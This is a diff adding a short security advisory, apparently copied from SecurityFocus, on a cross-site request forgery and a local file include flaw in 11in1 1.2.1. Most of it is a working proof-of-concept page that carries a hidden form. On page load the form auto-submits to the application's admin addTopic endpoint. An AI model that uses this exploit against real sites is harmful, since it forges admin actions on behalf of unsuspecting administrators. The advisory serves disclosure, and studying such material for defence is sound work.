@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/52025/info
+  
+11in1 is prone to a cross-site request-forgery and a local file include vulnerability.
+  
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, and open or run arbitrary files in the context of the affected application.
+  
+11in1 1.2.1 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/admin/index.php?class=do&action=addTopic" method="post">
+<input type="hidden" name="name" value="New Topic Name here">
+<input type="hidden" name="sec" value="3">
+<input type="hidden" name="content" value="New Topic Content here">
+<input type="submit" id="btn">
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
